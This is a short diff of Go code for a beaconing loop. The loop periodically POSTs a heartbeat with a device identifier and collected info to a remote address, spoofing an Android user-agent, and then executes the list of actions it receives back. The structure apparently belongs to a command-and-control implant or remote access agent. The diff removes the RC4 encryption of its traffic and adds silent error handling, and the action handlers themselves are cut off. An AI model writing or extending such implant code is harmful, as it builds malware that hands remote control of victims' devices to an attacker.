@@ -47,35 +47,33 @@ func (c *Core) Pool() {
 	client := &http.Client{}
 	for {
 		time.Sleep(time.Duration(c.sleep) * time.Second)
-		var action []Action
+		
 		data := Heartbeat{Uuid: c.uuid, Event: c.event, Info: c.info, Sleep: c.sleep}
 		c.event = nil
 		bytesJson, err := json.Marshal(data)
 		if err != nil {
 			continue
 		}
-		encode := utils.ImmediateRC4(bytesJson)
-		req, err := http.NewRequest("POST", c.remoteAddress, bytes.NewReader(encode))
+		
+		req, err := http.NewRequest("POST", c.remoteAddress, bytes.NewReader(bytesJson))
 		if err != nil {
-			//fmt.Println(2)
-			//log.Fatal(err)
+			continue
 		}
 		req.Header.Add("UA", "android")
 		resp, err := client.Do(req)
 		if err != nil {
-			//log.Fatal(err)
+			continue
 		}
 		body, err := ioutil.ReadAll(resp.Body)
 		if err != nil {
-			//fmt.Println(3)
-			//log.Fatal(err)
+			continue
 		}
-		decode := utils.ImmediateRC4(body)
 
-		err = json.Unmarshal(decode, &action)
+
+		var action []Action
+		err = json.Unmarshal(body, &action)
 		if err != nil {
-			//fmt.Println(4)
-			//log.Fatal(err)
+			continue
 		}
 		for _, i := range action {
 			switch i.Do {
